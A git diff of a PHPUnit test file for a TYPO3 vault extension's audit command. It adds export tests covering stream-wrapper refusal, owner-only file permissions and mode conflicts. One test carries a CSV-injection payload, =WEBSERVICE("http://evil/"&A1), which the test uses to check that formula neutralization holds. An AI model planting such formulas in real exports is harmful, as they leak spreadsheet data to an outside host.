@@ -12,6 +12,9 @@ namespace Netresearch\NrVault\Tests\Unit\Command;
 use Netresearch\NrVault\Audit\AuditChainAnchorStoreInterface;
 use Netresearch\NrVault\Audit\AuditLogEntry;
 use Netresearch\NrVault\Audit\AuditLogServiceInterface;
+use Netresearch\NrVault\Audit\Export\AuditChainExport;
+use Netresearch\NrVault\Audit\Export\AuditChainExporter;
+use Netresearch\NrVault\Audit\Export\AuditChainExporterInterface;
 use Netresearch\NrVault\Audit\HashChainVerificationResult;
 use Netresearch\NrVault\Command\VaultAuditCommand;
 use Netresearch\NrVault\Configuration\ExtensionConfigurationInterface;
@@ -31,6 +34,7 @@ use Symfony\Component\Console\Application;
 use Symfony\Component\Console\Tester\CommandTester;
 use TYPO3\CMS\Core\Database\Connection;
 use TYPO3\CMS\Core\Database\ConnectionPool;
+use TYPO3\CMS\Core\Utility\GeneralUtility;
 
 use function in_array;
 use function sprintf;
@@ -39,10 +43,17 @@ use function sprintf;
 #[AllowMockObjectsWithoutExpectations]
 final class VaultAuditCommandTest extends TestCase
 {
-    /** vfs path the CSV export tests write to. */
+    /** vfs path of the refused export, which never reaches the file system. */
     private const EXPORT_PATH = 'exports/audit.csv';
 
     private const IP_ADDRESS = '127.0.0.1';
+
+    /** File names the export tests write into their temporary directory. */
+    private const CSV_EXPORT_FILE = '/audit.csv';
+
+    private const JSON_EXPORT_FILE = '/audit.json';
+
+    private const VERIFY_EXPORT_FILE = 'vfs://exports/b.json';
 
     private AuditLogServiceInterface&MockObject $auditLogService;
 
@@ -51,6 +62,8 @@ final class VaultAuditCommandTest extends TestCase
     private ConnectionPool&MockObject $connectionPool;
 
     private AccessControlServiceInterface&MockObject $accessControlService;
+
+    private AuditChainExporterInterface&MockObject $chainExporter;
 
     /**
      * Permissions the mocked actor holds. Tests that exercise the gate narrow
@@ -62,6 +75,9 @@ final class VaultAuditCommandTest extends TestCase
 
     private CommandTester $commandTester;
 
+    /** @var list<string> */
+    private array $tempPaths = [];
+
     protected function setUp(): void
     {
         parent::setUp();
@@ -70,6 +86,7 @@ final class VaultAuditCommandTest extends TestCase
         $this->anchorStore          = $this->createMock(AuditChainAnchorStoreInterface::class);
         $this->connectionPool       = $this->createMock(ConnectionPool::class);
         $this->accessControlService = $this->createMock(AccessControlServiceInterface::class);
+        $this->chainExporter        = $this->createMock(AuditChainExporterInterface::class);
         $this->grantedPermissions   = VaultPermission::cases();
         $this->accessControlService
             ->method('isGranted')
@@ -83,6 +100,17 @@ final class VaultAuditCommandTest extends TestCase
         $application->addCommand($command);
 
         $this->commandTester = new CommandTester($command);
+    }
+
+    protected function tearDown(): void
+    {
+        foreach ($this->tempPaths as $path) {
+            GeneralUtility::rmdir($path, true);
+        }
+
+        $this->tempPaths = [];
+
+        parent::tearDown();
     }
 
     #[Test]
@@ -109,6 +137,12 @@ final class VaultAuditCommandTest extends TestCase
             ['--export' => 'vfs://exports/audit.json'],
             VaultPermission::AuditExport,
             'Access denied: the "audit.export" permission is required to export audit entries to a file.',
+        ];
+
+        yield 'verify-export' => [
+            ['--verify-export' => 'vfs://exports/audit.json'],
+            VaultPermission::AuditView,
+            'Access denied: the "audit.view" permission is required to verify an audit export file.',
         ];
 
         yield 'verify' => [
@@ -197,6 +231,8 @@ final class VaultAuditCommandTest extends TestCase
         $this->anchorStore->expects($this->never())->method('reset');
         $this->anchorStore->expects($this->never())->method('arm');
         $this->connectionPool->expects($this->never())->method('getConnectionForTable');
+        $this->chainExporter->expects($this->never())->method('select');
+        $this->chainExporter->expects($this->never())->method('verify');
 
         $exitCode = $this->commandTester->execute($arguments);
 
@@ -226,6 +262,7 @@ final class VaultAuditCommandTest extends TestCase
         vfsStream::setup('exports');
 
         $this->auditLogService->method('query')->willReturn([]);
+        $this->chainExporter->method('select')->willReturn(new AuditChainExport(0, 0, 0, 0, 0, null, null, []));
         $this->auditLogService->method('verifyHashChain')->willReturn(HashChainVerificationResult::valid());
         $this->anchorStore->method('sharesConnection')->willReturn(false);
         $this->connectionPool->method('getConnectionForTable')->willReturn($this->createMock(Connection::class));
@@ -262,6 +299,35 @@ final class VaultAuditCommandTest extends TestCase
             'Access denied: the "audit.export" permission is required to export audit entries to a file.',
             $this->normalizedDisplay(),
         );
+    }
+
+    /**
+     * --verify-export next to another mode would run that mode and never open
+     * the file, so a "valid" line could be read as the file's verdict.
+     *
+     * @return iterable<string, array{array<string, string|bool>}>
+     */
+    public static function conflictingVerifyExportProvider(): iterable
+    {
+        yield 'with --export' => [['--export' => 'vfs://exports/a.json', '--verify-export' => self::VERIFY_EXPORT_FILE]];
+        yield 'with --verify' => [['--verify' => true, '--verify-export' => self::VERIFY_EXPORT_FILE]];
+        yield 'with --reset-anchor' => [['--reset-anchor' => true, '--force' => true, '--verify-export' => self::VERIFY_EXPORT_FILE]];
+    }
+
+    /**
+     * @param array<string, string|bool> $arguments
+     */
+    #[DataProvider('conflictingVerifyExportProvider')]
+    #[Test]
+    public function verifyExportIsRefusedNextToAnotherMode(array $arguments): void
+    {
+        $this->chainExporter->expects($this->never())->method('verify');
+        $this->chainExporter->expects($this->never())->method('select');
+        $this->auditLogService->expects($this->never())->method('verifyHashChain');
+        $this->anchorStore->expects($this->never())->method('reset');
+
+        self::assertSame(1, $this->commandTester->execute($arguments));
+        self::assertStringContainsString('cannot be combined', $this->normalizedDisplay());
     }
 
     /**
@@ -498,12 +564,65 @@ final class VaultAuditCommandTest extends TestCase
         self::assertStringContainsString('epoch boundary', $display);
     }
 
+    /**
+     * A stream wrapper has no owner-only mode and may send the rows anywhere,
+     * so the export takes a local path only, and refuses before reading.
+     *
+     * @return iterable<string, array{string}>
+     */
+    public static function streamWrapperTargetProvider(): iterable
+    {
+        yield 'php://' => ['php://memory'];
+        yield 'ftp://' => ['ftp://example.org/audit.json'];
+        yield 'phar://' => ['phar:///tmp/x.phar/audit.json'];
+    }
+
+    #[DataProvider('streamWrapperTargetProvider')]
+    #[Test]
+    public function anExportToAStreamWrapperIsRefused(string $target): void
+    {
+        $this->chainExporter->expects($this->never())->method('select');
+
+        self::assertSame(1, $this->commandTester->execute(['--export' => $target]));
+        self::assertStringContainsString('takes a local file path, not a stream wrapper', $this->normalizedDisplay());
+    }
+
+    /**
+     * Whatever the umask, the export file is readable by its owner only.
+     */
+    #[Test]
+    public function theExportFileIsOwnerOnlyUnderAPermissiveUmask(): void
+    {
+        $this->stubExport([AuditChainExporter::exportRow([
+            'uid'               => 1,
+            'crdate'            => 1704067200,
+            'secret_identifier' => 'owner_only',
+            'action'            => 'read',
+            'success'           => 1,
+            'actor_uid'         => 1,
+            'entry_hash'        => 'hash',
+            'previous_hash'     => '',
+            'context'           => '{}',
+        ])]);
+        $exportFile = $this->createTempDir() . self::JSON_EXPORT_FILE;
+
+        $previous = umask(0o000);
+
+        try {
+            $exitCode = $this->commandTester->execute(['--export' => $exportFile]);
+        } finally {
+            umask($previous);
+        }
+
+        self::assertSame(0, $exitCode, $this->commandTester->getDisplay());
+        clearstatcache();
+        self::assertSame(0o600, fileperms($exportFile) & 0o777);
+    }
+
     #[Test]
     public function exportsToFile(): void
     {
-        vfsStream::setup('exports');
-
-        $entry = AuditLogEntry::fromDatabaseRow([
+        $entry = AuditChainExporter::exportRow([
             'uid'               => 1,
             'crdate'            => 1704067200,
             'secret_identifier' => 'exported',
@@ -518,11 +637,9 @@ final class VaultAuditCommandTest extends TestCase
             'context'           => '{}',
         ]);
 
-        $this->auditLogService
-            ->method('query')
-            ->willReturn([$entry]);
+        $this->stubExport([$entry]);
 
-        $exportFile = vfsStream::url('exports/audit.json');
+        $exportFile = $this->createTempDir() . self::JSON_EXPORT_FILE;
 
         $exitCode = $this->commandTester->execute([
             '--export' => $exportFile,
@@ -736,9 +853,7 @@ final class VaultAuditCommandTest extends TestCase
     #[Test]
     public function exportsToCsvFormat(): void
     {
-        vfsStream::setup('exports');
-
-        $entry = AuditLogEntry::fromDatabaseRow([
+        $entry = AuditChainExporter::exportRow([
             'uid'               => 1,
             'crdate'            => 1704067200,
             'secret_identifier' => 'csv-export',
@@ -753,11 +868,9 @@ final class VaultAuditCommandTest extends TestCase
             'context'           => '{}',
         ]);
 
-        $this->auditLogService
-            ->method('query')
-            ->willReturn([$entry]);
+        $this->stubExport([$entry]);
 
-        $exportFile = vfsStream::url(self::EXPORT_PATH);
+        $exportFile = $this->createTempDir() . self::CSV_EXPORT_FILE;
 
         $exitCode = $this->commandTester->execute([
             '--export' => $exportFile,
@@ -807,9 +920,7 @@ final class VaultAuditCommandTest extends TestCase
     #[Test]
     public function csvExportFileNeutralizesFormulaInUserAgentAndRequestId(): void
     {
-        vfsStream::setup('exports');
-
-        $entry = AuditLogEntry::fromDatabaseRow([
+        $entry = AuditChainExporter::exportRow([
             'uid'               => 1,
             'crdate'            => 1704067200,
             'secret_identifier' => 'benign_id',
@@ -826,11 +937,9 @@ final class VaultAuditCommandTest extends TestCase
             'context'           => '{}',
         ]);
 
-        $this->auditLogService
-            ->method('query')
-            ->willReturn([$entry]);
+        $this->stubExport([$entry]);
 
-        $exportFile = vfsStream::url(self::EXPORT_PATH);
+        $exportFile = $this->createTempDir() . self::CSV_EXPORT_FILE;
 
         $exitCode = $this->commandTester->execute([
             '--export' => $exportFile,
@@ -848,15 +957,13 @@ final class VaultAuditCommandTest extends TestCase
     #[Test]
     public function csvExportFileDoesNotBreakOutOfQuotedCellOnBackslashQuote(): void
     {
-        vfsStream::setup('exports');
-
         // Literal bytes: x\",=WEBSERVICE("http://evil/"&A1),y
         // With fputcsv's proprietary escape ('\\') the \" sequence is written
         // through unchanged and closes the quoted cell, so =WEBSERVICE(...)
         // becomes a cell of its own that the formula sanitizer never saw.
         $payload = 'x\\",=WEBSERVICE("http://evil/"&A1),y';
 
-        $entry = AuditLogEntry::fromDatabaseRow([
+        $entry = AuditChainExporter::exportRow([
             'uid'               => 1,
             'crdate'            => 1704067200,
             'secret_identifier' => 'benign_id',
@@ -873,11 +980,9 @@ final class VaultAuditCommandTest extends TestCase
             'context'           => '{}',
         ]);
 
-        $this->auditLogService
-            ->method('query')
-            ->willReturn([$entry]);
+        $this->stubExport([$entry]);
 
-        $exportFile = vfsStream::url(self::EXPORT_PATH);
+        $exportFile = $this->createTempDir() . self::CSV_EXPORT_FILE;
 
         $exitCode = $this->commandTester->execute([
             '--export' => $exportFile,
@@ -898,7 +1003,7 @@ final class VaultAuditCommandTest extends TestCase
         $rows = $this->parseCsvStrict($content);
         self::assertCount(2, $rows);
 
-        $columnIndex = array_search('userAgent', $rows[0], true);
+        $columnIndex = array_search('user_agent', $rows[0], true);
         self::assertIsInt($columnIndex);
         self::assertSame($payload, $rows[1][$columnIndex]);
         self::assertSameSize($rows[0], $rows[1]);
@@ -976,6 +1081,24 @@ final class VaultAuditCommandTest extends TestCase
         );
     }
 
+    /**
+     * @param non-empty-list<array<string, int|string>> $rows
+     */
+    private function stubExport(array $rows): void
+    {
+        $uids = array_map(static fn (array $row): int => (int) $row['uid'], $rows);
+        $this->chainExporter->method('select')->willReturn(new AuditChainExport(
+            max($uids),
+            count($rows),
+            count($rows),
+            min($uids),
+            max($uids),
+            null,
+            null,
+            $rows,
+        ));
+    }
+
     private function createCommandWith(
         ExtensionConfigurationInterface $configuration,
         TechnicalActorContextInterface $actorContext,
@@ -987,6 +1110,7 @@ final class VaultAuditCommandTest extends TestCase
             $this->accessControlService,
             $configuration,
             $actorContext,
+            $this->chainExporter,
         );
     }
 
@@ -999,6 +1123,7 @@ final class VaultAuditCommandTest extends TestCase
             $this->accessControlService,
             self::createStub(ExtensionConfigurationInterface::class),
             self::createStub(TechnicalActorContextInterface::class),
+            $this->chainExporter,
         );
     }
 
@@ -1008,6 +1133,15 @@ final class VaultAuditCommandTest extends TestCase
      * asserted. Collapsing runs of whitespace lets the tests pin the FULL
      * message instead of a fragment that survives the wrap.
      */
+    private function createTempDir(): string
+    {
+        $dir = sys_get_temp_dir() . '/nr-vault-audit-export-' . bin2hex(random_bytes(6));
+        mkdir($dir, 0o700);
+        $this->tempPaths[] = $dir;
+
+        return $dir;
+    }
+
     private function normalizedDisplay(): string
     {
         return $this->collapseWhitespace($this->commandTester->getDisplay());
@@ -1027,7 +1161,8 @@ final class VaultAuditCommandTest extends TestCase
     {
         $handle = fopen('php://memory', 'r+');
         self::assertIsResource($handle);
-        fwrite($handle, $csv);
+        // An export file starts with `#` metadata lines in front of the header.
+        fwrite($handle, (string) preg_replace('/\A(?:#[^\n]*\n)+/', '', $csv));
         rewind($handle);
 
         $rows = [];
